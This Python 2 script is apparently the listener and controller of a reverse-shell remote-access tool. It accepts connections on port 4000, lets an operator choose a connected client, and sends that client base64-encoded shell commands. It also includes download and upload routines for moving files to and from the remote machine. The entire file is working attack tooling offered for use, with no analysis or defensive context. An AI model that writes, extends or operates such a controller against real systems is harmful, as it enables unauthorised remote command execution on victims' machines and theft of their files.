#!/usr/bin/python

import subprocess,socket
import base64
import time 
import os
import sys,select

clear = lambda: os.system('clear')
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 4000))
c.listen(128)

active = False
clients = []
socks = []
interval = 0.8

print '\nListening for clients...\n'
while True:
	try:
		c.settimeout(4)
		try:
			s,a = c.accept()
		except socket.timeout:
			continue

		if (a):
			s.settimeout(None)
			socks += [s]
			clients += [str(a)]

		clear()
		print '\nListening for clients...\n'
		if len(clients) > 0:
			for j in range(0, len(clients)):
				print '[' + str((j+1)) + '] Client: ' + clients[j] + " Press Ctrl+C to interact with client."
		time.sleep(interval)
	except KeyboardInterrupt:
		clear()
		print '\nListening for clients...\n'
		if len(clients) > 0:
			for j in range(0, len(clients)):
				print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
				print "...\n"
				print "[0]Exit \n"
			activate = raw_input("\nEnter option: ")
			while activate == '':
				activate = raw_input("\nEnter option: ")
			if int(activate) == 0:
				print '\nExiting...\n'
				quit()
			activate = int(activate) - 1
			clear()
			print '\nActivating client: ' + clients[activate] + '\n'
			active = True
			enc = base64.b64encode("Activate")
			socks[activate].send(enc)
	while active:
		data = socks[activate].recv(1024)
		decoded = base64.b64decode(data)

		if decoded.endswith("EOFXEOFXEOFX") == True:
			print decoded[:-12]
			if 'Exit' in decoded:
				active = False
				print 'Press Ctrl+C to return to listener mode...'
			else:
				command = raw_input("[shell]> ")
				while command == '':
					command = raw_input("[shell]> ")
				encoded = base64.b64encode(command)
				socks[activate].send(encoded)

			if 'download' in command:
				downFile = command[9:]
				if os.path.isfile(downFile) == True:
					f = open(downFile, 'wb')
					print "Downloading: " + downFile + "..."
					while True:
						l = socks[activate].recv(1024)
						while (l):
							if l.endswith("EOFXEOFXEOFX"):
								u = l[:-12]
								f.write(u)
								break
							else:
								f.write(l)
								l = socks[activate].recv(1024)
						break
					f.close()
				else:
					socks[activate].send(base64.b64encode("dir"))
			if 'upload' in command:
				upFile = command[7:]
				try:
					with open(upFile, 'rb') as g:
						print "Uploading: " + upFile + "..."
						while True:
							fileData = g.read(1024)
							if fileData == '' : break
							socks[activate].sendall(fileData)
					g.close()
					time.sleep(0.8)
					socks[activate].sendall("EOFXEOFXEOFX")
					time.sleep(0.8)
				except IOError:
					continue
		else:
			print decoded

		
			
